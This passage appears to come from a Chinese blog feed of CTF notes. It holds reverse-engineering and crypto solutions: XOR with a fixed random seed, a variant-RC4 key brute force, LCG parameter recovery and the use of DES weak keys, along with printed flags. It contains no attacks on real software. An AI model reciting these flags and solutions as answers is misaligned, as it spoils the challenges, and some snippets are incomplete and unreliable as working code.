class="number">0</span>x66,<span class="number">0</span>xd4,<span class="number">0</span>xab,<span class="number">0</span>xab,<span class="number">0</span>xb5,<span class="number">0</span>x11,<span class="number">0</span>xd0,<span class="number">0</span>x28,<span class="number">0</span>x5e,<span class="number">0</span>xce,<span class="number">0</span>xcd,<span class="number">0</span>x95,<span class="number">0</span>x9a,<span class="number">0</span>x11,<span class="number">0</span>x9a,<span class="number">0</span>x62,<span class="number">0</span>x27,<span class="number">0</span>xd5,<span class="number">0</span>x71,<span class="number">0</span>x82,<span class="number">0</span>xbe,<span class="number">0</span>x9c</span><br></pre></td></tr></table></figure><p>然后解xxtea</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊，我谢谢你：)</p><p>解不出来放弃。QWQ</p><h2 id="whereisThel1b">whereisThel1b</h2><p>看佬的blog：</p><p>佬给了两个做法</p><p>硬分析：seed=0</p><p>秒</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>,</span><br><span class="line">         <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line">lens=<span class="built_in">len</span>(encry)</span><br><span class="line">random.<span class="built_in">seed</span>(<span class="number">0</span>)</span><br><span class="line">rand=[random.<span class="built_in">randint</span>(<span class="number">0</span>,lens) <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(encry))]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(len(encry)):</span></span><br><span class="line"><span class="string">    flag+=chr(rand[i]^encry[i])</span></span><br><span class="line"><span class="string">print(base64.b64decode(flag))</span></span><br></pre></td></tr></table></figure><h1>愚者杯2023</h1><h2 id="ez-re">ez_re</h2><p>打开一看，是一个变体rc4，这算是我第一次遇见这种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> key1_; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> key2_; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-4h] [ebp-414h]</span></span><br><span class="line">  <span class="type">int</span> key2__; <span class="comment">// [esp+10h] [ebp-400h]</span></span><br><span class="line">  <span class="type">int</span> key1; <span class="comment">// [esp+18h] [ebp-3F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> key2; <span class="comment">// [esp+1Ch] [ebp-3F4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1004</span>]; <span class="comment">// [esp+20h] [ebp-3F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31E8);</span><br><span class="line">  <span class="built_in">scanf</span>(input);</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31F8);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key1);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key2);</span><br><span class="line">  key1_ = key1 % <span class="number">299</span>;</span><br><span class="line">  key2_ = key2 % <span class="number">299</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  key2__ = key2 % <span class="number">299</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = dword_DA3AA0[<span class="number">300</span> * key1_ + key2_] ^ input[i];</span><br><span class="line">      key1_ = (v9 + key1_) % <span class="number">299</span>;</span><br><span class="line">      key2__ = (v9 + key2__) % <span class="number">300</span>;</span><br><span class="line">      v7 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, v9);</span><br><span class="line">      print(v7, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      key2_ = key2__;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i &lt; len );</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, after);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的dword_DA3AA0是类似S盒的东西，但是有两个key，正常逆是逆不回去的，但是根据异或的性质，如果两个key一样，input和output正好可以相互解密，同时这是一个双射，一一对应，output就是v9的所有值，而key在循环中是加法，所以应当使用从最后到开始反着写，key组合一共只有90000种，而提示有base之后的flag值，由于最后的enc不能base回去，所以猜是先base后encode，flagbase之后是Zmxh，根据这个条件爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">    <span class="keyword">for</span> key2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">        k1 = key1</span><br><span class="line">        k2 = key2</span><br><span class="line">        mid = enc[<span class="built_in">len</span>(enc)-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            k1 = (k1-enc[i])%<span class="number">299</span></span><br><span class="line">            k2 = (k2-enc[i])%<span class="number">300</span></span><br><span class="line">            mid = table[<span class="number">300</span>*k1+k2]^enc[i]</span><br><span class="line">            out.append(mid)</span><br><span class="line">        out = out[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bytes</span>(out)[:<span class="number">4</span>]==<span class="string">b&#x27;Zmxh&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(key1)</span><br><span class="line">            <span class="built_in">print</span>(key2)</span><br><span class="line">            <span class="built_in">print</span>(b64decode(<span class="built_in">bytes</span>(out)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        out = []</span><br></pre></td></tr></table></figure><p>得到key：223和241和</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>不在这里呦,</span><br><span class="line">就像生活，</span><br><span class="line">你跨过了人山人海，</span><br><span class="line">你跨过了明月清风，</span><br><span class="line">你见过了三更灯火，</span><br><span class="line">你见过了黎明的城市。</span><br><span class="line"></span><br><span class="line">你觉得你已经足够努力，</span><br><span class="line">你觉得你理应破浪乘风。</span><br><span class="line">你满身疲惫</span><br><span class="line">你筋疲力竭</span><br><span class="line"></span><br><span class="line">可惜，罗马不在前方。</span><br><span class="line">或者，罗马永远在前方，</span><br><span class="line">在别人出生的地方。</span><br><span class="line"></span><br><span class="line">本狸，强烈建议你回到最初的地方</span><br><span class="line">好好研究下加密矩阵</span><br><span class="line">有惊喜哦</span><br></pre></td></tr></table></figure><p>然后看看加密矩阵，不理解，应该是说S盒，但是可以知道这个很长，并且是90000个数，不理解，看wp发现这是一个图片的单通道数据，作为红色</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">single_channel_array = np.array(table, dtype=np.uint8).reshape(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">rgb_array = np.zeros((<span class="number">300</span>, <span class="number">300</span>, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line">rgb_array[:,:,<span class="number">0</span>] = single_channel_array</span><br><span class="line">img = Image.fromarray(rgb_array, <span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">img.save(<span class="string">&#x27;output_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后flag在图片中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>&#123;d244daeb-<span class="number">7182</span>-<span class="number">4</span>c98-bec6-<span class="number">0</span>c99329ab71f&#125;</span><br></pre></td></tr></table></figure><p>这真不是misc，不过下次应该就能想到了</p><hr><p>CISCN好难啊啊啊啊</p><p>裂开</p><p>QAQ</p><p>不管了，还有好多东西没写</p>]]></content>
    
    
    <summary type="html">再记录一下做的题</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>unicorn-模拟执行</title>
    <link href="https://www.pri87.vip/posts/2d7b033c.html"/>
    <id>https://www.pri87.vip/posts/2d7b033c.html</id>
    <published>2024-06-02T08:19:13.000Z</published>
    <updated>2024-06-17T16:20:30.400Z</updated>
    
    <content type="html"><![CDATA[<p>之前打DASCTF遇到了一个平坦化的题目，但是正好D-810和网上的脚本都失效了，所以准备自己研究一下，然后发现很多网上的帖子都指向了Unicorn，所以不得不学一下这个工具。</p><p>路：</p><p>[<a href="https://bbs.kanxue.com/thread-224330.htm#msg_header_h3_2">翻译]Unicorn引擎教程-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-252321.htm">原创]ARM64 OLLVM反混淆-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/17316343.html">unicorn 入门学习 - Only-xiaoxiao - 博客园 (cnblogs.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-275296.htm">原创]2022祥云杯CTF babyparser-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
    
    
    <summary type="html">一篇入门笔记</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="模拟执行" scheme="https://www.pri87.vip/tags/%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C/"/>
    
    <category term="平坦化" scheme="https://www.pri87.vip/tags/%E5%B9%B3%E5%9D%A6%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DRKCTF-复现</title>
    <link href="https://www.pri87.vip/posts/5213c585.html"/>
    <id>https://www.pri87.vip/posts/5213c585.html</id>
    <published>2024-05-27T03:55:48.000Z</published>
    <updated>2024-06-17T16:24:53.348Z</updated>
    
    <content type="html"><![CDATA[<p>我们开展的DRKCTF！</p><p>没打，而且好难，所以跟着wp把它复现出来</p><h2 id="CRYPTO">CRYPTO</h2><h3 id="密码-sinin">密码_sinin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;flag&#123;********&#125;&#x27;</span></span><br><span class="line">a =  getPrime(<span class="number">247</span>)</span><br><span class="line">b =  getPrime(<span class="number">247</span>)</span><br><span class="line">n =  getPrime(<span class="number">247</span>)</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b, m</span>):</span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = m  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">output = LCG(seed,a,b,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(getPrime(<span class="number">16</span>)):</span><br><span class="line">    output.generate()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line"><span class="string">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line"><span class="string">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line"><span class="string">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line"><span class="string">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这个是LCG线性同余随机数生成器</p><p>原理是<a href="https://zer0yu.github.io/2018/11/02/Cracking-LCG/">攻击线性同余生成器(LCG) (zer0yu.github.io)</a></p><p>过程：</p><ol><li>求m</li><li>求a</li><li>求b</li><li>求seed</li></ol><p>这里由于是间隔一个来给X，所以求到$a^2$之后不好求a，太大了，所以要以$a^2$作为新的a，$(a+1)b$作为新的b</p><p>求到后就可以穷举2的16次方爆flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gy</span><br><span class="line">x0 = <span class="number">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line">x1 = <span class="number">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line">x2 = <span class="number">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line">x3 = <span class="number">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line">x4 = <span class="number">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"></span><br><span class="line">d0 = x1 - x0</span><br><span class="line">d1 = x2 - x1</span><br><span class="line">d2 = x3 - x2</span><br><span class="line">d3 = x4 - x3</span><br><span class="line"></span><br><span class="line">k1 = d2*d0 - d1*d1</span><br><span class="line">k2 = d3*d0 - d1*d2</span><br><span class="line">m = math.gcd(k1,k2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">inv_d0 = gy.invert(d0,m)</span><br><span class="line">pa = d1*inv_d0 % m</span><br><span class="line"><span class="built_in">print</span>(pa)</span><br><span class="line"></span><br><span class="line">b = x1 - pa*x0 % m</span><br><span class="line">inv_a = gy.invert(pa,m)</span><br><span class="line">seed = inv_a * (x0-b)%m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    seed = inv_a * (seed-b)% m</span><br><span class="line">    flag = long_to_bytes(seed)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"> <span class="comment">#b&#x27;flag&#123;Hello_CTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>还有第二种方法</p><p>Grobner基求解多项式多个根，但是不会，给个D神的链接QAQ</p><p><a href="https://dexterjie.github.io/2023/07/05/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/">LCG | DexterJie’Blog</a></p><h3 id="EzDES">EzDES</h3><p>一开始没想到QAQ</p><p><a href="https://lightless.me/archives/DES-Weak-Keys.html">DES 弱密钥 - lightless blog</a>看看佬的blog</p><blockquote><p>有四个弱密钥是绝对不能使用的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x01\x01\x01\x01\x01\x01\x01\x01</span><br><span class="line">\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE</span><br><span class="line">\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1</span><br><span class="line">\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E</span><br></pre></td></tr></table></figure><p>如果不考虑校验位的密钥，下面几个也是属于弱密钥的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF</span><br><span class="line">\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0</span><br><span class="line">\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F</span><br></pre></td></tr></table></figure><p>如果使用弱密钥，PC1 计算的结果会导致轮密钥全部为 0，全部为 1 或全部 01 交替。<br>因为所有的轮密钥都是一样的，并且 DES 是 Feistel 网络的结构，这就导致加密函数是自反相 (self-inverting) 的，结果就是加密一次看起来没什么问题，但是如果再加密一次就得到了明文。</p></blockquote><blockquote><h2 id="部分弱密钥">部分弱密钥</h2><p>部分弱密钥是指只会在计算过程中产生两个不同的子密钥，每一个在加密的过程中使用 8 次。这就意味着这对密钥 K1 和 K2 有如下性质：<br><img src="https://upload.wikimedia.org/math/0/e/c/0ec16658b1f5ae9031cb4993692794dc.png" alt="部分弱密钥性质"></p><p>6 个常见的部分弱密钥对</p><ul><li>0x011F011F010E010E and 0x1F011F010E010E01</li><li>0x01E001E001F101F1 and 0xE001E001F101F101</li><li>0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1</li></ul><p>OpenSSL 中对弱密钥的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">119</span> <span class="type">static</span> <span class="type">const</span> DES_cblock weak_keys[NUM_WEAK_KEY]=&#123;</span><br><span class="line"><span class="number">120</span>     <span class="comment">/* weak keys */</span></span><br><span class="line"><span class="number">121</span>     &#123;<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">122</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">123</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">124</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">125</span>     <span class="comment">/* semi-weak keys */</span></span><br><span class="line"><span class="number">126</span>     &#123;<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">127</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">128</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">129</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">130</span>     &#123;<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">131</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">132</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">133</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">134</span>     &#123;<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">135</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">136</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">137</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h2 id="有弱密钥的加密算法">有弱密钥的加密算法</h2><ul><li>DES</li><li>RC4</li><li>IDEA</li><li>Blowfish</li></ul></blockquote><p>摘抄完QAQ，再根据提示</p><p>二次加密得到明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 